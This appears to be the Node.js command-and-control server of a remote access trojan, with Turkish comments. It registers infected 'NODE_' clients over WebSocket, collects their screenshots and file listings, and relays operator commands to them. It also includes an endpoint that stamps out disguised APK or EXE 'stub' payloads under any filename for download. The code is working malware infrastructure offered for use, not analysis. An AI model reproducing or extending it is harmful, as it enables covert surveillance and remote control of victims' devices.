const express = require('express');
const ws = require('ws');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

const HTTP_PORT = 3000;
const WS_PORT = 8080;
let clients = [];

// Şablon ve indirme klasörlerini otomatik oluşturma
const templatesDir = path.join(__dirname, 'templates');
const downloadsDir = path.join(__dirname, 'downloads');
if (!fs.existsSync(templatesDir)) fs.mkdirSync(templatesDir);
if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir);

const wss = new ws.Server({ port: WS_PORT }, () => {
    console.log(`[*] Gelişmiş Soket Sunucusu Aktif | Port: ${WS_PORT}`);
});

wss.on('connection', (socket, req) => {
    const clientId = "NODE_" + Math.random().toString(36).substring(2, 7).toUpperCase();
    const clientIp = req.socket.remoteAddress ? req.socket.remoteAddress.replace('::ffff:', '') : '127.0.0.1';
    
    const clientInfo = {
        id: clientId,
        ip: clientIp,
        status: "Çevrimiçi",
        lastSeen: Date.now(),
        files: [],
        currentScreen: ""
    };
    
    clients.push({ info: clientInfo, socket: socket });

    socket.on('message', (message) => {
        try {
            const payload = JSON.parse(message);
            const target = clients.find(c => c.socket === socket);
            if (target) {
                target.info.lastSeen = Date.now();
                target.info.status = "Çevrimiçi";
                if (payload.type === "SCREENSHOT") target.info.currentScreen = payload.data;
                else if (payload.type === "FILE_LIST") target.info.files = payload.data;
                else target.info.lastResponse = payload.data || message.toString();
            }
        } catch (e) {
            const target = clients.find(c => c.socket === socket);
            if (target) {
                target.info.lastSeen = Date.now();
                target.info.lastResponse = message.toString();
            }
        }
    });

    socket.on('close', () => {
        const target = clients.find(c => c.socket === socket);
        if (target) target.info.status = "Çevrimdışı";
    });
});

// --- API ENDPOINTS ---
app.get('/api/clients', (req, res) => res.json(clients.map(c => c.info)));

app.post('/api/command', (req, res) => {
    const { clientId, commandId, extraData } = req.body;
    const target = clients.find(c => c.info.id === clientId);
    if (!target || target.info.status !== "Çevrimiçi") return res.status(404).json({ error: "Cihaz aktif değil." });
    target.socket.send(JSON.stringify({ commandId: parseInt(commandId), data: extraData || "" }));
    res.json({ success: true, message: "Komut gönderildi." });
});

// Dinamik APK / EXE Üretici Endpoint'i
app.post('/api/generate', (req, res) => {
    const { filename, type } = req.body; // type: 'apk' veya 'exe'
    if (!filename || !type) return res.status(400).json({ error: "Eksik parametre." });

    const sourcePath = path.join(templatesDir, `stub.${type}`);
    const outputPath = path.join(downloadsDir, `${filename}.${type}`);

    // Eğer arka planda gerçek bir stub (şablon binary) yoksa, test için boş dosya oluşturur
    if (!fs.existsSync(sourcePath)) {
        fs.writeFileSync(sourcePath, "STUB_DATA_PLACEHOLDER");
    }

    try {
        fs.copyFileSync(sourcePath, outputPath);
        res.json({ success: true, downloadUrl: `http://localhost:${HTTP_PORT}/download/${filename}.${type}` });
    } catch (err) {
        res.status(500).json({ error: "Dosya oluşturma hatası." });
    }
});

// İndirme Dağıtımı
app.get('/download/:file', (req, res) => {
    const file = req.params.file;
    const filePath = path.join(downloadsDir, file);
    if (fs.existsSync(filePath)) res.download(filePath);
    else res.status(404).send("Dosya bulunamadı.");
});

app.get('/style.css', (req, res) => res.sendFile(path.join(__dirname, 'style.css')));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.listen(HTTP_PORT, () => console.log(`[+] Sunucu aktif: http://localhost:${HTTP_PORT}`));
